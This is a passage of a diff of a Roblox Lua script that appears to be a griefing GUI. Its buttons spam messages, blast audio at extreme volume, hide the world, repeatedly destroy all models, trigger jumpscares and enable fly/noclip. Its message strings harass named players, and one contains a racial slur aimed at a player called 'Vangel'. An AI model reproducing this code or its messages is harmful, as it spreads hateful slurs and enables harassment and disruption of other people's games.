-                rainPart.Position = Vector3.new(math.random(-1000, 1000), math.random(500, 1000), math.random(-1000, 1000))
-                rainPart.Anchored = false
-                rainPart.CanCollide = false
-                rainPart.Transparency = 0.5
-                rainPart.Material = Enum.Material.SmoothPlastic
-                rainPart.BrickColor = BrickColor.new("Bright blue")
+                        local currentVelocity = hotdog.AssemblyLinearVelocity.Magnitude
+                        local isOnGround = hotdog.Position.Y < 5 
 
-                -- **Force Falling Motion**
-                local velocity = Instance.new("BodyVelocity", rainPart)
-                velocity.Velocity = Vector3.new(0, -200, 0) -- **Rain Falls Faster**
-                velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-
-                rainPart.Parent = workspace
-                task.delay(2, function()
-                    rainPart:Destroy()
-                end)
-            end
-            task.wait(0.05) -- **Spam even faster**
-        end
-    end
-
-    -- **📢 Hint Messages**
-    local function showHints()
-        local hints = {
-            "Cashier: Please pay your debt",
-            "Cashier: Nuts .i.",
-            "Cashier: Die, die, DIE YOU IDIOT!"
-        }
-        while true do
-            for _, hintText in ipairs(hints) do
-                local hint = Instance.new("Hint")
-                hint.Text = hintText
-                hint.Parent = game.Workspace
-                task.wait(3)
-                hint:Destroy()
-            end
-        end
-    end
-
-    -- **📩 Message Spammer (Fixed)**
-    local function spawnMessages()
-        while true do
-            local message = Instance.new("Message", workspace)
-            message.Text = "Yaazkidd: No no no, *shooted*. Cashier: Shut the hell up."
-            task.wait(0.3)
-            message:Destroy()
-            task.wait(0.3)
-        end
-    end
-
-    -- **🚀 Run Everything**
-    task.spawn(createMesh)
-    task.spawn(createRain)
-    task.spawn(showHints)
-    task.spawn(spawnMessages)
-end)
-local function createButton(buttonName, callback)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 200, 0, 50)
-    button.Position = UDim2.new(0.5, -100, 0.5, 0)
-    button.Text = buttonName
-    button.Parent = game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Button Created",
-        Text = buttonName .. " added!",
-        Duration = 3
-    })
-
-    button.MouseButton1Click:Connect(callback)
-end
-
-createButton("Cashier Roast", function()
-    local Players = game:GetService("Players")
-    local Lighting = game:GetService("Lighting")
-    local SoundService = game:GetService("SoundService")
-    local Debris = game:GetService("Debris")
-
-    local player = Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-
-    repeat task.wait() until character:FindFirstChild("HumanoidRootPart")
-
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-
-    -- **👻 Hide Player & Disable Movement**
-    for _, v in pairs(character:GetDescendants()) do
-        if v:IsA("BasePart") then
-            v.Transparency = 1
-            v.CanCollide = false
-        elseif v:IsA("Decal") then
-            v:Destroy()
-        end
-    end
-    if humanoid then
-        humanoid.WalkSpeed = 0
-        humanoid.JumpPower = 0
-    end
-
-    -- **🔄 Stop All Sounds & Play Horror Music**
-    for _, sound in pairs(SoundService:GetDescendants()) do
-        if sound:IsA("Sound") then sound:Stop() end
-    end
-    local music = Instance.new("Sound", SoundService)
-    music.SoundId = "rbxassetid://1836137223"
-    music.Looped = true
-    music.Volume = 5
-    music:Play()
-
-    -- **🌌 Set Scary Skybox**
-    local sky = Instance.new("Sky", Lighting)
-    sky.SkyboxBk = "rbxassetid://110077545590416"
-    sky.SkyboxDn = "rbxassetid://110077545590416"
-    sky.SkyboxFt = "rbxassetid://110077545590416"
-    sky.SkyboxLf = "rbxassetid://110077545590416"
-    sky.SkyboxRt = "rbxassetid://110077545590416"
-    sky.SkyboxUp = "rbxassetid://110077545590416"
-
-    -- **🛑 Fixed Falling Mesh (FALLS PROPERLY FOR 7 SECONDS)**
-    local function createMesh()
-        while true do
-            for _ = 1, 15 do -- **Faster Mesh Rain**
-                local part = Instance.new("Part", workspace)
-                part.Name = "CashierKiller"
-                part.Size = Vector3.new(20, 20, 20)
-                part.Position = Vector3.new(math.random(-3000, 1000), math.random(500, 1000), math.random(-3000, 3000))
-                part.CanCollide = false
-                part.Anchored = false  
-
-                -- **Add Mesh**
-                local mesh = Instance.new("SpecialMesh", part)
-                mesh.MeshType = "FileMesh"
-                mesh.MeshId = "rbxassetid://10802419004"
-                mesh.TextureId = "rbxassetid://10802419119"
-                mesh.Scale = Vector3.new(20, 20, 20)
-
-                -- **Make It Fall Properly**
-                local velocity = Instance.new("BodyVelocity", part)
-                velocity.Velocity = Vector3.new(0, -50, 0) -- **Falls smoothly, not instantly**
-                velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge) 
-
-                -- **Delete After 7 Seconds**
-                task.delay(7, function()
-                    part:Destroy()
-                end)
-            end
-            task.wait(0.05) -- **Faster spawn rate**
-        end
-    end
-
-    -- **🌧️ Super-Fast Rain**
-    local function createRain()
-        while true do
-            for _ = 1, 150 do -- **150 rain drops at once**
-                local rainPart = Instance.new("Part", workspace)
-                rainPart.Size = Vector3.new(0.3, 2, 0.3)
-                rainPart.Position = Vector3.new(math.random(-1000, 1000), math.random(500, 1000), math.random(-1000, 1000))
-                rainPart.Anchored = false
-                rainPart.CanCollide = false
-                rainPart.Transparency = 0.5
-                rainPart.Material = Enum.Material.SmoothPlastic
-                rainPart.BrickColor = BrickColor.new("Bright blue")
-
-                -- **Force Falling Motion**
-                local velocity = Instance.new("BodyVelocity", rainPart)
-                velocity.Velocity = Vector3.new(0, -200, 0) -- **Rain Falls Faster**
-                velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-
-                rainPart.Parent = workspace
-                task.delay(2, function()
-                    rainPart:Destroy()
-                end)
-            end
-            task.wait(0.05) -- **Spam even faster**
-        end
-    end
-
-    -- **📢 Hint Messages**
-    local function showHints()
-        local hints = {
-            "Cashier: Please pay your debt",
-            "Cashier: Nuts .i.",
-            "Cashier: Die, die, DIE YOU IDIOT!"
-        }
-        while true do
-            for _, hintText in ipairs(hints) do
-                local hint = Instance.new("Hint")
-                hint.Text = hintText
-                hint.Parent = game.Workspace
-                task.wait(3)
-                hint:Destroy()
-            end
-        end
-    end
-
-    -- **📩 Message Spammer (Fixed)**
-    local function spawnMessages()
-        while true do
-            local message = Instance.new("Message", workspace)
-            message.Text = "Yaazkidd: No no no, *shooted*. Cashier: Shut the hell up."
-            task.wait(0.3)
-            message:Destroy()
-            task.wait(0.3)
-        end
-    end
-
-    -- **🚀 Run Everything**
-    task.spawn(createMesh)
-    task.spawn(createRain)
-    task.spawn(showHints)
-    task.spawn(spawnMessages)
-end)
-
-    createButton("IT'S HOTDOG DAY!!", function()
-        local player = game.Players.LocalPlayer
-        local character = player.Character
-        if character then
-            for _, part in pairs(game.Workspace:GetDescendants()) do
-                if part:IsA("BasePart") or part:IsA("Decal") then
-                    part.Transparency = 1
-                end
-            end
-
-            for _, part in pairs(character:GetChildren()) do
-                if part:IsA("BasePart") or part:IsA("Decal") then
-                    part.Transparency = 1
-                end
-            end
-
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            if humanoid then
-                humanoid.WalkSpeed = 0
-                humanoid.JumpPower = 0
-            end
-        end
-
-        local hint = Instance.new("Hint")
-        hint.Text = "HOT DOGGED BY YAAZ? HOW LOSER!"
-        hint.Parent = game.Workspace
-
-        for _, sound in pairs(game.Workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
-            end
-        end
-
-        local hotDogSong = Instance.new("Sound")
-        hotDogSong.SoundId = "rbxassetid://121252384962048"
-        hotDogSong.Looped = true
-        hotDogSong.Volume = 999999
-        hotDogSong.Parent = game.Workspace
-        hotDogSong:Play()
-
-        spawn(function()
-            while true do
-                for i = 1, 6 do
-                    local hotdog = Instance.new("Part", workspace)
-                    hotdog.Name = "HotDog"
-                    hotdog.Size = Vector3.new(1, 1, 1)
-                    hotdog.Position = Vector3.new(
-                        math.random(-250, 250),
-                        math.random(80, 120),
-                        math.random(-250, 250)
-                    )
-                    hotdog.CanCollide = false
-                    hotdog.Anchored = false
-
-                    local mesh = Instance.new("SpecialMesh", hotdog)
-                    mesh.MeshType = "FileMesh"
-                    mesh.MeshId = "rbxassetid://6318954843"
-                    mesh.TextureId = "rbxassetid://6318954910"
-                    mesh.Scale = Vector3.new(7, 7, 7)
-
-                    hotdog.Velocity = Vector3.new(0, -50, 0)
-
-                    spawn(function()
-                        local startTime = tick() 
-                        local lastVelocity = hotdog.AssemblyLinearVelocity.Magnitude
-                        while hotdog and hotdog.Parent do
-                            wait(0.5)
-
-                            local currentVelocity = hotdog.AssemblyLinearVelocity.Magnitude
-                            local isOnGround = hotdog.Position.Y < 5 
-
-                            if (currentVelocity < 0.2 and lastVelocity < 0.2) or isOnGround then
-                                wait(1) 
-                                if hotdog and hotdog.Parent then
-                                    hotdog:Destroy()
-                                end
-                                break
+                        if (currentVelocity < 0.2 and lastVelocity < 0.2) or isOnGround then
+                            wait(1) 
+                            if hotdog and hotdog.Parent then
+                                hotdog:Destroy()
                             end
-
-                            if tick() - startTime > 10 then 
-                                if hotdog and hotdog.Parent then
-                                    hotdog:Destroy()
-                                end
-                                break
-                            end
-
-                            lastVelocity = currentVelocity
+                            break
                         end
-                    end)
-                end
-                wait(0.5)
-            end
-        end)
 
-        local skyboxCoroutine = coroutine.create(function()
-            while wait(0.3) do
-                for _, sky in pairs(game.Lighting:GetChildren()) do
-                    if sky:IsA("Sky") then
-                        sky:Destroy()
+                        if tick() - startTime > 10 then 
+                            if hotdog and hotdog.Parent then
+                                hotdog:Destroy()
+                            end
+                            break
+                        end
+
+                        lastVelocity = currentVelocity
                     end
-                end
-
-                local skybox = Instance.new("Sky", game.Lighting)
-                skybox.SkyboxBk = "rbxassetid://79236980509669"
-                skybox.SkyboxDn = "rbxassetid://79236980509669"
-                skybox.SkyboxFt = "rbxassetid://79236980509669"
-                skybox.SkyboxLf = "rbxassetid://79236980509669"
-                skybox.SkyboxRt = "rbxassetid://79236980509669"
-                skybox.SkyboxUp = "rbxassetid://79236980509669"
-                skybox.CelestialBodiesShown = false
+                end)
             end
-        end)
-
-        coroutine.resume(skyboxCoroutine)
-
-        local msg = coroutine.create(function()
-            while wait(0.4) do
-                local message = Instance.new("Message", workspace)
-                message.Text = "GOT HOTDOGGED BY YAAZ AKA QUITOS LOOOOOLLL"
-                wait(0.4)
-                message:Destroy()
-            end
-        end)
-
-        coroutine.resume(msg)
+            wait(0.5)
+        end
     end)
 
-    createButton("Scary lol", function()
-        local sound = Instance.new("Sound", game.Workspace)
-        sound.SoundId = "rbxassetid://209322206"
-        sound.Volume = 10
-        sound.Looped = false
-        sound:Play()
-
-        for _, obj in pairs(game.Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") then
-                obj.Color = math.random(1, 2) == 1 and Color3.new(0, 0, 0) or Color3.new(1, 0, 0)
-                obj.Material = Enum.Material.Slate
+    local skyboxCoroutine = coroutine.create(function()
+        while wait(0.3) do
+            for _, sky in pairs(game.Lighting:GetChildren()) do
+                if sky:IsA("Sky") then
+                    sky:Destroy()
+                end
             end
+
+            local skybox = Instance.new("Sky", game.Lighting)
+            skybox.SkyboxBk = "rbxassetid://79236980509669"
+            skybox.SkyboxDn = "rbxassetid://79236980509669"
+            skybox.SkyboxFt = "rbxassetid://79236980509669"
+            skybox.SkyboxLf = "rbxassetid://79236980509669"
+            skybox.SkyboxRt = "rbxassetid://79236980509669"
+            skybox.SkyboxUp = "rbxassetid://79236980509669"
+            skybox.CelestialBodiesShown = false
         end
-
-        local lighting = game:GetService("Lighting")
-        lighting.FogStart = 0
-        lighting.FogEnd = 50
-        lighting.FogColor = Color3.new(0, 0, 0)
-        lighting.Ambient = Color3.new(0.3, 0, 0)
-        lighting.OutdoorAmbient = Color3.new(0.3, 0, 0)
-        lighting.Brightness = 0.2
-
-        for i = 1, 5 do
-            local msg = Instance.new("Message", game.Workspace)
-            msg.Text = "YOU CAN'T ESCAPE..."
-            game:GetService("Debris"):AddItem(msg, 2)
-        end
-
-        wait(1)
-
-        local jumpscareGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
-        local jumpscareImg = Instance.new("ImageLabel", jumpscareGui)
-        jumpscareImg.Size = UDim2.new(1, 0, 1, 0)
-        jumpscareImg.Image = "rbxassetid://135547930230734"
-        jumpscareImg.BackgroundTransparency = 1
-        jumpscareImg.ZIndex = 9999
-
-        local jumpscareSound = Instance.new("Sound", jumpscareGui)
-        jumpscareSound.SoundId = "rbxassetid://7991927928"
-        jumpscareSound.Volume = 10
-        jumpscareSound.Looped = false
-        jumpscareSound:Play()
-        wait(5)
-        jumpscareGui:Destroy()
     end)
 
-    createButton("Plane", function()
-        local player = game.Players.LocalPlayer
-        local char = player.Character or player.CharacterAdded:Wait()
+    coroutine.resume(skyboxCoroutine)
 
-        if not char:FindFirstChild("HumanoidRootPart") then return end
-
-        for _, v in pairs(char:GetChildren()) do
-            if v:IsA("BasePart") then
-                v.Transparency = 1
-            elseif v:IsA("Accessory") or v:IsA("Clothing") then
-                v.Parent = nil
-            end
-        end
-
-        local planeModel = Instance.new("Model", workspace)
-        planeModel.Name = "PlayerPlane"
-
-        local body = Instance.new("Part", planeModel)
-        body.Size = Vector3.new(8, 2, 14)
-        body.Position = char.HumanoidRootPart.Position
-        body.Shape = Enum.PartType.Cylinder
-        body.Orientation = Vector3.new(0, 90, 0)
-        body.Color = Color3.fromRGB(255, 255, 255)
-        body.Material = Enum.Material.SmoothPlastic
-        body.Anchored = false
-        body.CanCollide = false
-
-        local nose = Instance.new("Part", planeModel)
-        nose.Size = Vector3.new(4, 2, 4)
-        nose.Shape = Enum.PartType.Ball
-        nose.Position = body.Position + Vector3.new(0, 0, 7)
-        nose.Color = Color3.fromRGB(255, 255, 255)
-        nose.Material = Enum.Material.SmoothPlastic
-        nose.Anchored = false
-        nose.CanCollide = false
-
-        local cockpit = Instance.new("Part", planeModel)
-        cockpit.Size = Vector3.new(3, 1.5, 2)
-        cockpit.Position = body.Position + Vector3.new(0, 1, 5)
-        cockpit.Material = Enum.Material.Glass
-        cockpit.Color = Color3.fromRGB(0, 150, 255)
-        cockpit.Anchored = false
-        cockpit.CanCollide = false
-
-        local leftWing = Instance.new("Part", planeModel)
-        leftWing.Size = Vector3.new(10, 0.5, 3)
-        leftWing.Position = body.Position + Vector3.new(-6, 0, 0)
-        leftWing.Color = Color3.fromRGB(255, 255, 255)
-        leftWing.Anchored = false
-        leftWing.CanCollide = false
-
-        local rightWing = leftWing:Clone()
-        rightWing.Position = body.Position + Vector3.new(6, 0, 0)
-        rightWing.Parent = planeModel
-
-        local tailWing = Instance.new("Part", planeModel)
-        tailWing.Size = Vector3.new(4, 0.5, 2)
-        tailWing.Position = body.Position + Vector3.new(0, 1, -7)
-        tailWing.Color = Color3.fromRGB(255, 255, 255)
-        tailWing.Anchored = false
-        tailWing.CanCollide = false
-
-        local engineLeft = Instance.new("Part", planeModel)
-        engineLeft.Size = Vector3.new(1.5, 1.5, 3)
-        engineLeft.Shape = Enum.PartType.Cylinder
-        engineLeft.Orientation = Enum.PartType.Cylinder
-        engineLeft.Position = leftWing.Position + Vector3.new(0, -1, 0)
-        engineLeft.Color = Color3.fromRGB(100, 100, 100)
-        engineLeft.Anchored = false
-        engineLeft.CanCollide = false
-
-        local engineRight = engineLeft:Clone()
-        engineRight.Position = rightWing.Position + Vector3.new(0, -1, 0)
-        engineRight.Parent = planeModel
-
-        local function weldParts(part0, part1)
-            local weld = Instance.new("Weld", part0)
-            weld.Part0 = part0
-            weld.Part1 = part1
-            weld.C0 = part0.CFrame:inverse() * part1.CFrame
-        end
-
-        weldParts(body, nose)
-        weldParts(body, cockpit)
-        weldParts(body, leftWing)
-        weldParts(body, rightWing)
-        weldParts(body, tailWing)
-        weldParts(body, engineLeft)
-        weldParts(body, engineRight)
-
-        local weld = Instance.new("Weld", body)
-        weld.Part0 = char.HumanoidRootPart
-        weld.Part1 = body
-        weld.C0 = CFrame.new(0, 0, 0)
-
-        local bodyVelocity = Instance.new("BodyVelocity", char.HumanoidRootPart)
-        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
-        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-
-        local function NoClip()
-            for _, v in pairs(char:GetDescendants()) do
-                if v:IsA("BasePart") then
-                    v.CanCollide = false
-                end
-            end
-        end
-
-        local trail = Instance.new("Trail", body)
-        local attachment0 = Instance.new("Attachment", body)
-        local attachment1 = Instance.new("Attachment", body)
-        attachment0.Position = Vector3.new(0, 0, -6)
-        attachment1.Position = Vector3.new(0, 0, 6)
-        trail.Attachment0 = attachment0
-        trail.Attachment1 = attachment1
-        trail.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(0, 150, 255))
-        trail.Lifetime = 0.5
-        trail.Enabled = true
-
-        local flying = true
-        local speed = 50
-        local up = false
-        local down = false
-        local UIS = game:GetService("UserInputService")
-
-        UIS.InputBegan:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.W then up = true end
-            if input.KeyCode == Enum.KeyCode.S then down = true end
-        end)
-
-        UIS.InputEnded:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.W then up = false end
-            if input.KeyCode == Enum.KeyCode.S then down = false end
-        end)
-
-        local function GetJoystickInput()
-            return player:GetMouse().Hit.p - char.HumanoidRootPart.Position
-        end
-
-        game:GetService("RunService").RenderStepped:Connect(function()
-            if flying then
-                NoClip()
-                local direction = char.HumanoidRootPart.CFrame.LookVector
-                local yVelocity = 0
-
-                if UIS.TouchEnabled then
-                    local moveDir = GetJoystickInput()
-                    if moveDir.Y > 0.5 then
-                        yVelocity = 30
-                    elseif moveDir.Y < -0.5 then
-                        yVelocity = -30
-                    end
-                else
-                    if up then yVelocity = 30 end
-                    if down then yVelocity = -30 end
-                end
-
-                bodyVelocity.Velocity = direction * speed + Vector3.new(0, yVelocity, 0)
-            end
-        end)
-
-        char.Humanoid.Died:Connect(function()
-            flying = false
-            planeModel:Destroy()
-            for _, v in pairs(char:GetChildren()) do
-                if v:IsA("BasePart") then v.Transparency = 0 end
-            end
-        end)
-    end)
-
-    createButton("Nachos", function()
-        local SKYBOX_ID = "rbxassetid://116355300471902"
-        local MESH_ID = "rbxassetid://13049164651"
-        local TEXTURE_ID = "rbxassetid://13049164734"
-        local SOUND_ID = "rbxassetid://1845230355"
-
-        local function createSkybox()
-            local sky = Instance.new("Sky", game.Lighting)
-            sky.SkyboxBk = SKYBOX_ID
-            sky.SkyboxDn = SKYBOX_ID
-            sky.SkyboxFt = SKYBOX_ID
-            sky.SkyboxLf = SKYBOX_ID
-            sky.SkyboxRt = SKYBOX_ID
-            sky.SkyboxUp = SKYBOX_ID
-            sky.CelestialBodiesShown = false
-        end
-
-        local function destroyModels()
-            for _, model in pairs(workspace:GetChildren()) do
-                if model:IsA("Model") then
-                    model:Destroy()
-                end
-            end
-        end
-
-        local function playNachosSound()
-            local sound = Instance.new("Sound", workspace)
-            sound.SoundId = SOUND_ID
-            sound.Name = "NACHOS"
-            sound.Volume = 0.5
-            sound.Looped = true
-            sound:Play()
-            return sound
-        end
-
-        local function spawnNachos()
-            local part = Instance.new("Part", workspace)
-            part.Name = "Nachos"
-            part.CanCollide = false
-            part.Anchored = false
-            part.Size = Vector3.new(5, 5, 5)
-            part.Position = Vector3.new(math.random(-1000, 1000), 200, math.random(-1000, 1000))
-
-            local mesh = Instance.new("SpecialMesh", part)
-            mesh.MeshId = MESH_ID
-            mesh.TextureId = TEXTURE_ID
-            mesh.MeshType = "FileMesh"
-            mesh.Scale = Vector3.new(20, 20, 20)
-        end
-
-        local function displayNachosMessage()
-            local msg = Instance.new("Message", workspace)
-            msg.Text = "Vangel how did you got nachoed by Yaaz you black nigger"
+    local msg = coroutine.create(function()
+        while wait(0.4) do
+            local message = Instance.new("Message", workspace)
+            message.Text = "GOT HOTDOGGED BY YAAZ AKA QUITOS LOOOOOLLL"
             wait(0.4)
-            msg:Destroy()
+            message:Destroy()
         end
+    end)
 
-        local function skyboxLoop()
-            while wait(0.3) do
-                createSkybox()
+    coroutine.resume(msg)
+end)
+
+createButton("Scary lol", function()
+    local sound = Instance.new("Sound", game.Workspace)
+    sound.SoundId = "rbxassetid://209322206"
+    sound.Volume = 10
+    sound.Looped = false
+    sound:Play()
+
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            obj.Color = math.random(1, 2) == 1 and Color3.new(0, 0, 0) or Color3.new(1, 0, 0)
+            obj.Material = Enum.Material.Slate
+        end
+    end
+
+    local lighting = game:GetService("Lighting")
+    lighting.FogStart = 0
+    lighting.FogEnd = 50
+    lighting.FogColor = Color3.new(0, 0, 0)
+    lighting.Ambient = Color3.new(0.3, 0, 0)
+    lighting.OutdoorAmbient = Color3.new(0.3, 0, 0)
+    lighting.Brightness = 0.2
+
+    for i = 1, 5 do
+        local msg = Instance.new("Message", game.Workspace)
+        msg.Text = "YOU CAN'T ESCAPE..."
+        game:GetService("Debris"):AddItem(msg, 2)
+    end
+
+    wait(1)
+
+    local jumpscareGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+    local jumpscareImg = Instance.new("ImageLabel", jumpscareGui)
+    jumpscareImg.Size = UDim2.new(1, 0, 1, 0)
+    jumpscareImg.Image = "rbxassetid://135547930230734"
+    jumpscareImg.BackgroundTransparency = 1
+    jumpscareImg.ZIndex = 9999
+
+    local jumpscareSound = Instance.new("Sound", jumpscareGui)
+    jumpscareSound.SoundId = "rbxassetid://7991927928"
+    jumpscareSound.Volume = 10
+    jumpscareSound.Looped = false
+    jumpscareSound:Play()
+    wait(5)
+    jumpscareGui:Destroy()
+end)
+
+createButton("Plane", function()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+
+    if not char:FindFirstChild("HumanoidRootPart") then return end
+
+    for _, v in pairs(char:GetChildren()) do
+        if v:IsA("BasePart") then
+            v.Transparency = 1
+        elseif v:IsA("Accessory") or v:IsA("Clothing") then
+            v.Parent = nil
+        end
+    end
+
+    local planeModel = Instance.new("Model", workspace)
+    planeModel.Name = "PlayerPlane"
+
+    local body = Instance.new("Part", planeModel)
+    body.Size = Vector3.new(8, 2, 14)
+    body.Position = char.HumanoidRootPart.Position
+    body.Shape = Enum.PartType.Cylinder
+    body.Orientation = Vector3.new(0, 90, 0)
+    body.Color = Color3.fromRGB(255, 255, 255)
+    body.Material = Enum.Material.SmoothPlastic
+    body.Anchored = false
+    body.CanCollide = false
+
+    local nose = Instance.new("Part", planeModel)
+    nose.Size = Vector3.new(4, 2, 4)
+    nose.Shape = Enum.PartType.Ball
+    nose.Position = body.Position + Vector3.new(0, 0, 7)
+    nose.Color = Color3.fromRGB(255, 255, 255)
+    nose.Material = Enum.Material.SmoothPlastic
+    nose.Anchored = false
+    nose.CanCollide = false
+
+    local cockpit = Instance.new("Part", planeModel)
+    cockpit.Size = Vector3.new(3, 1.5, 2)
+    cockpit.Position = body.Position + Vector3.new(0, 1, 5)
+    cockpit.Material = Enum.Material.Glass
+    cockpit.Color = Color3.fromRGB(0, 150, 255)
+    cockpit.Anchored = false
+    cockpit.CanCollide = false
+
+    local leftWing = Instance.new("Part", planeModel)
+    leftWing.Size = Vector3.new(10, 0.5, 3)
+    leftWing.Position = body.Position + Vector3.new(-6, 0, 0)
+    leftWing.Color = Color3.fromRGB(255, 255, 255)
+    leftWing.Anchored = false
+    leftWing.CanCollide = false
+
+    local rightWing = leftWing:Clone()
+    rightWing.Position = body.Position + Vector3.new(6, 0, 0)
+    rightWing.Parent = planeModel
+
+    local tailWing = Instance.new("Part", planeModel)
+    tailWing.Size = Vector3.new(4, 0.5, 2)
+    tailWing.Position = body.Position + Vector3.new(0, 1, -7)
+    tailWing.Color = Color3.fromRGB(255, 255, 255)
+    tailWing.Anchored = false
+    tailWing.CanCollide = false
+
+    local engineLeft = Instance.new("Part", planeModel)
+    engineLeft.Size = Vector3.new(1.5, 1.5, 3)
+    engineLeft.Shape = Enum.PartType.Cylinder
+    engineLeft.Orientation = Enum.PartType.Cylinder
+    engineLeft.Position = leftWing.Position + Vector3.new(0, -1, 0)
+    engineLeft.Color = Color3.fromRGB(100, 100, 100)
+    engineLeft.Anchored = false
+    engineLeft.CanCollide = false
+
+    local engineRight = engineLeft:Clone()
+    engineRight.Position = rightWing.Position + Vector3.new(0, -1, 0)
+    engineRight.Parent = planeModel
+
+    local function weldParts(part0, part1)
+        local weld = Instance.new("Weld", part0)
+        weld.Part0 = part0
+        weld.Part1 = part1
+        weld.C0 = part0.CFrame:inverse() * part1.CFrame
+    end
+
+    weldParts(body, nose)
+    weldParts(body, cockpit)
+    weldParts(body, leftWing)
+    weldParts(body, rightWing)
+    weldParts(body, tailWing)
+    weldParts(body, engineLeft)
+    weldParts(body, engineRight)
+
+    local weld = Instance.new("Weld", body)
+    weld.Part0 = char.HumanoidRootPart
+    weld.Part1 = body
+    weld.C0 = CFrame.new(0, 0, 0)
+
+    local bodyVelocity = Instance.new("BodyVelocity", char.HumanoidRootPart)
+    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+
+    local function NoClip()
+        for _, v in pairs(char:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
             end
         end
+    end
 
-        local function destroyLoop()
-            while wait(0.3) do
-                destroyModels()
+    local trail = Instance.new("Trail", body)
+    local attachment0 = Instance.new("Attachment", body)
+    local attachment1 = Instance.new("Attachment", body)
+    attachment0.Position = Vector3.new(0, 0, -6)
+    attachment1.Position = Vector3.new(0, 0, 6)
+    trail.Attachment0 = attachment0
+    trail.Attachment1 = attachment1
+    trail.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(0, 150, 255))
+    trail.Lifetime = 0.5
+    trail.Enabled = true
+
+    local flying = true
+    local speed = 50
+    local up = false
+    local down = false
+    local UIS = game:GetService("UserInputService")
+
+    UIS.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.W then up = true end
+        if input.KeyCode == Enum.KeyCode.S then down = true end
+    end)
+
+    UIS.InputEnded:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.W then up = false end
+        if input.KeyCode == Enum.KeyCode.S then down = false end
+    end)
+
+    local function GetJoystickInput()
+        return player:GetMouse().Hit.p - char.HumanoidRootPart.Position
+    end
+
+    game:GetService("RunService").RenderStepped:Connect(function()
+        if flying then
+            NoClip()
+            local direction = char.HumanoidRootPart.CFrame.LookVector
+            local yVelocity = 0
+
+            if UIS.TouchEnabled then
+                local moveDir = GetJoystickInput()
+                if moveDir.Y > 0.5 then
+                    yVelocity = 30
+                elseif moveDir.Y < -0.5 then
+                    yVelocity = -30
+                end
+            else
+                if up then yVelocity = 30 end
+                if down then yVelocity = -30 end
+            end
+
+            bodyVelocity.Velocity = direction * speed + Vector3.new(0, yVelocity, 0)
+        end
+    end)
+
+    char.Humanoid.Died:Connect(function()
+        flying = false
+        planeModel:Destroy()
+        for _, v in pairs(char:GetChildren()) do
+            if v:IsA("BasePart") then v.Transparency = 0 end
+        end
+    end)
+end)
+
+createButton("Nachos", function()
+    local SKYBOX_ID = "rbxassetid://116355300471902"
+    local MESH_ID = "rbxassetid://13049164651"
+    local TEXTURE_ID = "rbxassetid://13049164734"
+    local SOUND_ID = "rbxassetid://1845230355"
+
+    local function createSkybox()
+        local sky = Instance.new("Sky", game.Lighting)
+        sky.SkyboxBk = SKYBOX_ID
+        sky.SkyboxDn = SKYBOX_ID
+        sky.SkyboxFt = SKYBOX_ID
+        sky.SkyboxLf = SKYBOX_ID
+        sky.SkyboxRt = SKYBOX_ID
+        sky.SkyboxUp = SKYBOX_ID
+        sky.CelestialBodiesShown = false
+    end
+
+    local function destroyModels()
+        for _, model in pairs(workspace:GetChildren()) do
+            if model:IsA("Model") then
+                model:Destroy()
             end
         end
+    end
 
-        local function soundLoop()
-            local sound = playNachosSound()
-            while wait(1) do
-                if not workspace:FindFirstChild("NACHOS") then
-                    sound = playNachosSound()
+    local function playNachosSound()
+        local sound = Instance.new("Sound", workspace)
+        sound.SoundId = SOUND_ID
+        sound.Name = "NACHOS"
+        sound.Volume = 0.5
+        sound.Looped = true
+        sound:Play()
+        return sound
+    end
+
+    local function spawnNachos()
+        local part = Instance.new("Part", workspace)
+        part.Name = "Nachos"
+        part.CanCollide = false
+        part.Anchored = false
+        part.Size = Vector3.new(5, 5, 5)
+        part.Position = Vector3.new(math.random(-1000, 1000), 200, math.random(-1000, 1000))
+
+        local mesh = Instance.new("SpecialMesh", part)
+        mesh.MeshId = MESH_ID
+        mesh.TextureId = TEXTURE_ID
+        mesh.MeshType = "FileMesh"
+        mesh.Scale = Vector3.new(20, 20, 20)
+    end
+
+    local function displayNachosMessage()
+        local msg = Instance.new("Message", workspace)
+        msg.Text = "Vangel how did you got nachoed by Yaaz you black nigger"
+        wait(0.4)
+        msg:Destroy()
+    end
+
+    local function skyboxLoop()
+        while wait(0.3) do
+            createSkybox()
+        end
+    end
+
+    local function destroyLoop()
+        while wait(0.3) do
+            destroyModels()
+        end
+    end
+
+    local function soundLoop()
+        local sound = playNachosSound()
+        while wait(1) do
+            if not workspace:FindFirstChild("NACHOS") then
+                sound = playNachosSound()
+            end
+        end
+    end
+
+    local function messageLoop()
+        while wait(0.4) do
+            displayNachosMessage()
+        end
+    end
+
+    local function nachosRainLoop()
+        while wait(1 / 30) do
+            spawnNachos()
+        end
+    end
+
+    coroutine.wrap(skyboxLoop)()
+    coroutine.wrap(destroyLoop)()
+    coroutine.wrap(soundLoop)()
+    coroutine.wrap(messageLoop)()
+    coroutine.wrap(nachosRainLoop)()
+
+    local bgSound = Instance.new("Sound")
+    bgSound.SoundId = SOUND_ID
